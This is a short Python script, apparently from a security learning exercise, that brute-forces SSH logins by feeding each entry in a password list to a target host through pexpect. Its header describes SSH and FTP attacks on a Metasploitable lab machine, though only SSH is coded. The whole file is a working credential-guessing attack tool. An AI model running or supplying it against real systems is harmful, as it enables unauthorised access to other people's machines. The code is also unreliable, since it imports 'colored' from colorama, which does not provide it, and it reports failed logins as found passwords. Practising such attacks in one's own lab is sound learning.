#!/usr/bin/python
import pexpect
from colorama import colored

#Author: Daniel Edwards
#Date: 12/24/2019
#Description: SSH & FTP attacks against metasploitable machine
#Disclaimer: This script is meant to be used in your own virtual environment against intentionally vulnerable machines.


PROMPT = ['# ', '>>>', '>', '\\$']


def send_command(child,command):
	child.sendline(command)
	child.expect(PROMPT)
	print(child.before)


def connect(user,host,password):
	ssh_newkey = 'Are you sure you want to continue connecting?'
	connStr = 'ssh ' + user + '@' + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])

	if ret == 0:
		print('[-] Error Connecting')
		return

	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])

		if ret == 0:
			print ('[-] Error connecting')
			return

	child.sendline(password)
	child.expect(PROMPT)
	return child


def main():
	host = input("Enter IP: ")
	user = input("Enter user account name: ")
	file = open('passwords.txt','r')

	for passwd in file.readlines():
		passwd = passwd.strip('\n')
		try:
			child = connect(user,host,passwd)
			print(colored('[+] Password Found: ' + passwd, 'green'))

		except:
			print(colored('Wrong Password: ' + passwd, 'red'))

main()